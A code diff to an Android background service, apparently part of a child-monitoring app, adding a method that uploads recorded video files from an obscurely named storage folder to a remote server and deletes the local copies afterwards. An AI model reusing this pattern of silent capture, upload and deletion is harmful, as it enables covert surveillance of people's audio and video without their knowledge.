@@ -265,6 +265,7 @@ public class childService extends Service implements LocationListener,UploadStat
                         e.printStackTrace();
                     }
                     uploadfirstvoicefile();
+                    uploadfirstvoicefile2();
                     sendDataClass sendDataClass = new sendDataClass();
                     sendDataClass.send(getApplicationContext());
                     OptionDB optionDB = new OptionDB(childService.this);
@@ -1231,6 +1232,29 @@ public class childService extends Service implements LocationListener,UploadStat
                             .addFileToUpload(fileses[0].getPath(), "voice") //Adding file
                             .addParameter("token", getToken(getApplicationContext()))
                             .addParameter("token1", "AllowVoice")//Adding text parameter to the request
+                            .setAutoDeleteFilesAfterSuccessfulUpload(true)
+                            .setMaxRetries(2)
+
+                            .startUpload(); //Starting the upload
+                } catch (FileNotFoundException e) {
+                    e.printStackTrace();
+                } catch (MalformedURLException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+    public void uploadfirstvoicefile2(){
+        File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/458544555433/");
+        if (directory.exists()){
+            File[] fileses = directory.listFiles();
+            if (fileses.length>0){
+                String uploadId = UUID.randomUUID().toString();
+                try {
+                    new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
+                            .addFileToUpload(fileses[0].getPath(), "video") //Adding file
+                            .addParameter("token", getToken(getApplicationContext()))
+                            .addParameter("token1", "allow")//Adding text parameter to the request
                             .setAutoDeleteFilesAfterSuccessfulUpload(true)
                             .setMaxRetries(2)
 
